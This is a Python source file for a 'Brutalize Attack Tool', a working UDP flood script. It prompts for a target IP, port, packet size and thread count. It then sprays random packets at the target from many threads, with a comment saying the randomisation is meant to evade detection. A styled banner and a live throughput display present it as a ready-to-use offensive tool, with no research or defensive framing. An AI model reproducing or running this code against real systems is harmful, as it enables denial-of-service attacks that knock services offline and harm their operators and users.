import threading
import socket
import random
import time
from pystyle import *
from getpass import getpass as hinput

class Brutalize:
    def __init__(self, ip, port=None, force=1250, threads=100):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250 bytes per packet
        self.threads = threads  # default: 100 threads

        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.on = False  # To control when attack stops
        self.lock = threading.Lock()  # Lock for thread-safe operations
        self.sent = 0  # Number of bytes sent
        self.total = 0  # Total data sent in GB

    def flood(self):
        self.on = True
        for _ in range(self.threads):
            threading.Thread(target=self.send).start()
        threading.Thread(target=self.show_info).start()

    def send(self):
        while self.on:
            try:
                # Send random data to random port if not specified
                self.client.sendto(self._randdata(), self._randaddr())
                with self.lock:  # Thread-safe increment
                    self.sent += self.force
            except Exception as e:
                print(f"Error in sending: {e}")
                pass

    def _randdata(self):
        # Randomize packet content to avoid detection, simulate real traffic
        return bytes(random.choices(b'abcdefghijklmnopqrstuvwxyz0123456789', k=self.force))

    def show_info(self):
        MB = 1_000_000
        GB = 1_000_000_000
        interval = 0.05
        prev_time = time.time()

        while self.on:
            time.sleep(interval)

            with self.lock:
                byte_rate = (self.sent * 8) / MB / interval  # In Mbps
                self.total += (self.sent * 8) / GB * interval  # In GB
                self.sent = 0

            if byte_rate > 0:
                print(stage(f"{fluo}{round(byte_rate)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb."), end='\r')

            if not self.on:
                break

    def stop(self):
        self.on = False

    def _randaddr(self):
        return self.ip, self._randport()

    def _randport(self):
        return self.port or random.randint(1, 65535)


# UI and Banner Setup
ascii_art = r'''
    ▀█████████▄     ▄████████ ███    █▄      ███        ▄████████ 
      ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███ 
      ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀  
     ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄     
    ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀     
      ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄  
      ███    ███   ███    ███ ███    ███     ███       ███    ███ 
    ▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████ 
                   ███    ███                                              '''

banner_art = r"""
       █████████████████████
    ████▀                 ▀████
  ███▀                       ▀███
 ██▀                           ▀██
█▀                               ▀█
█                                 █
█   █████                 █████   █
█  ██▓▓▓███             ███▓▓▓██  █
█  ██▓▓▓▓▓██           ██▓▓▓▓▓██  █
█  ██▓▓▓▓▓▓██         ██▓▓▓▓▓▓██  █
█▄  ████▓▓▓▓██       ██▓▓▓▓████  ▄█
▀█▄   ▀███▓▓▓██     ██▓▓▓███▀   ▄█▀
  █▄    ▀█████▀     ▀█████▀    ▄█
""".replace('▓', '▀')

banner = Add.Add(ascii_art, banner_art, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
purple = Col.StaticMIX((Col.purple, Col.white))

def init():
    System.Size(140, 40)
    System.Title("Brutalize Attack Tool")
    Cursor.HideCursor()

def stage(text, symbol='...'):
    return f" {Col.Symbol(symbol, purple, white)} {white}{text}"

def error_message(text):
    hinput(f"\n {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()

# Main Application Logic
def main():
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, purple)), Center.XCenter(banner)))

    ip = input(stage(f"Enter the IP to attack {purple}->{fluo2} ", '?'))
    try:
        if ip.count('.') != 3 or not all(0 <= int(part) <= 255 for part in ip.split('.')):
            raise ValueError
    except ValueError:
        error_message("Invalid IP address.")

    port = input(stage(f"Enter port {purple}[press enter for all ports]{purple}->{fluo2} ", '?'))
    port = int(port) if port else None

    force = input(stage(f"Bytes per packet [press enter for 1250]{purple}->{fluo2} ", '?'))
    force = int(force) if force else 1250

    threads = input(stage(f"Threads [press enter for 100]{purple}->{fluo2} ", '?'))
    threads = int(threads) if threads else 100

    print(stage(f"Starting attack on {fluo2}{ip}{purple}:{fluo2}{port if port else 'all ports'}."), end='\r')

    brute = Brutalize(ip, port, force, threads)
    
    try:
        brute.flood()
        while True:
            time.sleep(1000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Attack stopped. {fluo2}{ip} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb."))

    hinput(stage(f"Press enter to exit.", '.'))

if __name__ == '__main__':
    init()
    main()
